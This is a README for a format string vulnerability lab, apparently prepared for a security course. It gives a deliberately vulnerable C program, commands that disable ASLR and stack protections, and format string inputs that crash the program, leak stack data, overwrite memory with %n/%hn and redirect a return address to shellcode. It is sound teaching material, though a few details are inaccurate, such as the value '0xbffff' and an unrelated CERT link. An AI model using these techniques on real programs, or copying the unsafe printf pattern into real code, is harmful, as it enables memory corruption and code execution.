Below is an updated **README.md** that includes step‐by‐step guidance for carrying out the **five attacks** on the vulnerable program **vul**. Adapt and refine as needed for your course.

---

# Format String Vulnerability Lab

This repository contains a **vulnerable C program** (*vul.c*) illustrating classic format string attacks. The code compiles into an executable, **vul**, which you can use to explore how improper format string usage can lead to crashing, leaking data, and even arbitrary code execution. 

> **Disclaimer**: The instructions and examples below are for **educational and research purposes only**. Running this code or similar attack strings on production systems is unsafe and may be illegal. Proceed within the confines of an isolated lab environment.

---

## Table of Contents

1. [Overview](#overview)  
2. [Setup](#setup)  
3. [Attack 1: Crash the Program](#attack-1-crash-the-program)  
4. [Attack 2: Print Out Data on the Stack](#attack-2-print-out-data-on-the-stack)  
5. [Attack 3: Change Program’s Data in Memory](#attack-3-change-programs-data-in-memory)  
6. [Attack 4: A Faster (Partial Overwrite) Approach](#attack-4-a-faster-partial-overwrite-approach)  
7. [Attack 5: Inject Malicious Code (Return Address Overwrite)](#attack-5-inject-malicious-code-return-address-overwrite)  
8. [Restoring ASLR](#restoring-aslr)  
9. [Further Reading & References](#further-reading--references)

---

## Overview

The vulnerable code is roughly as follows:

```c
#include <stdio.h>

void fmtstr() {
    char input[100];
    int var = 0x11223344;

    printf("Target address: %x\n", (unsigned) &var);
    printf("Data at target address: 0x%x\n", var);

    printf("Please enter a string: ");
    fgets(input, sizeof(input), stdin);

    // The vulnerable call
    printf(input);

    printf("Data at target address: 0x%x\n", var);
}

int main() {
    fmtstr();
    return 0;
}
```

The key vulnerability is the direct use of `printf(input);` without a proper format string specifier—allowing user‐supplied data to be interpreted as directives for printing (and even writing to) memory.

---

## Setup

1. **Clone or copy** this repository onto a **Linux** system, preferably a VM or container.
2. **Disable ASLR** (recommended for easier exploitation during the lab):
   ```bash
   sudo sh -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
   ```
3. **Compile** the program:
   ```bash
   gcc -m32 -z execstack -fno-stack-protector -o vul vul.c
   ```
   - `-m32`: 32‐bit compilation (you may need 32‐bit libraries installed).  
   - `-z execstack`: marks the stack as executable (helpful for certain code‐injection attacks).  
   - `-fno-stack-protector`: disables stack canaries.
4. **Run**:
   ```bash
   ./vul
   ```
   You should see output similar to:
   ```
   Target address: bffff304
   Data at target address: 0x11223344
   Please enter a string:
   ```

---

## Attack 1: Crash the Program

**Goal**: Force the program to **segfault** by using `%s` specifiers.

1. **Why it works**: Each `%s` in the format string tells `printf` to interpret the next 4 bytes on the stack as a **pointer to a string**, and then to print characters from that pointer’s memory address. If the pointer is invalid (pointing to unmapped memory), the program crashes.

2. **Try**:
   ```bash
   ./vul
   Please enter a string:
   %s%s%s%s%s%s%s%s
   ```
   You should get:
   ```
   Segmentation fault (core dumped)
   ```
3. **Explanation**: Each `%s` advances the internal `va_list` pointer by 4 bytes, tries to treat that data as an address, and attempts to read from it. Since the addresses are effectively random stack contents, eventually a bad address is accessed.

---

## Attack 2: Print Out Data on the Stack

**Goal**: Reveal secret information from the stack—e.g., the content of local variables.

1. **Method**: Use `%x` to repeatedly dump the next 4 bytes on the stack in hexadecimal.
2. **Example**:
   ```bash
   ./vul
   Please enter a string:
   %x.%x.%x.%x.%x.%x
   ```
   You might see output like:
   ```
   63 b7fc5ac0 b7eb8309 bffff33f 11223344 252e7825 ...
   ```
   Notice that the variable `var` (0x11223344) eventually appears. By adding or removing `%x`s, you adjust how many times `printf` advances the pointer before printing a value—thus “walking” the stack.

3. **Tips**:
   - Keep adding `%x` to find the exact offset needed to print `var`.
   - The exact number depends on your system setup, compiler, and environment.

---

## Attack 3: Change Program’s Data in Memory

**Goal**: Overwrite a local variable (e.g., `var`) using `%n`.

1. **Method**:  
   - Use addresses of the target variable in the input, plus `%n` to write the number of characters printed so far into that address.
   - Prepend characters or use `%x` specifiers to control how large the “number of characters printed so far” is.

2. **Example**:
   ```bash
   # Suppose the target address is 0xbffff304
   # We'll place its bytes in the input (in little-endian form).
   echo $(printf "\x04\xf3\xff\xbf")."%x.%x.%x.%x.%x.%n" > input
   ./vul < input
   ```
   You might see the program report:
   ```
   Data at target address: 0x2c
   ```
   meaning we wrote decimal 44 (0x2c) into `var`. The length of preceding text (including the “%.x” expansions) ended up being 44 characters.

3. **Explanation**:
   - `%n` instructs `printf` to store the (decimal) count of characters printed so far into the address pointed to by the corresponding argument.
   - By adjusting how many characters are printed before `%n` (e.g., adding spaces, letters, or using `%x`), you control the value that gets written.

---

## Attack 4: A Faster (Partial Overwrite) Approach

**Goal**: Overwrite only **certain bytes** of a target variable efficiently, without printing massive amounts of characters each time.

1. **Concept**:
   - Split a 4‐byte address into two 2‐byte chunks, and write to them separately using `%hn` (which writes a 16‐bit value).
   - Adjust the total printed character count so that each `%hn` writes the desired value.

2. **Steps** (example from slides):
   - Overwrite bytes at `0xbffff306` with `0x6688`.
   - Then later cause `0xbffff304` to hold `0x7799`.
   - Carefully craft the format string so that:
     - The first `%hn` prints 26248 (0x6688) minus the characters you’ve already printed.
     - The second `%hn` prints 30617 (0x7799) minus *all* characters printed so far, ensuring the partial overwrite of the lower 2 bytes, etc.

3. **Result**:
   - You end up with two consecutive 2-byte writes: one sets part of the data to `0x6688`, the other sets part of the data to `0x7799`.
   - The final value in memory can be something like `0x66887799` (depending on endianness).

---

## Attack 5: Inject Malicious Code (Return Address Overwrite)

**Goal**: Overwrite the **return address** with the address of **shellcode** or other malicious code you place on the stack.

1. **Prerequisites**:
   - **Shellcode** or malicious payload placed on the stack.  
   - The exact address of your payload (using GDB or trial/error).
   - The address of the return pointer you want to overwrite (also found via GDB).

2. **Example** scenario:
   - Suppose the return address is `0xbffff38c`.
   - Shellcode starts at `0xbffff358`.
   - We want `0xbffff38c` to contain `0xbffff358` when the function returns.
3. **Method**:
   - Break `0xbffff38c` into two 2-byte locations: `0xbffff38c` and `0xbffff38e`.
   - Overwrite them in two steps with `%hn`.
     - First write `0xbffff` to `0xbffff38e`.
     - Then write `0xf358` to `0xbffff38c`.
   - When the function returns, EIP/RIP is set to `0xbffff358`, jumping to your shellcode.

4. **Result**:
   - The program returns into your shellcode, executing malicious instructions.

---

## Restoring ASLR

Once you have finished the lab:

```bash
sudo sh -c 'echo 2 > /proc/sys/kernel/randomize_va_space'
```
This re‐enables ASLR, returning your system to its default security setting.

---

## Further Reading & References

- **Aleph One**, “Smashing the Stack for Fun and Profit,” *Phrack*, 1996.  
- **[MITRE CWE-134: Use of Externally-Controlled Format String](https://cwe.mitre.org/data/definitions/134.html)**  
- [**CERT Secure Coding** on Format String Vulnerabilities](https://wiki.sei.cmu.edu/confluence/display/c/ENV03-C.+Sanitize+the+environment+when+invoking+external+programs)

---

**Happy (Safe) Hacking!**  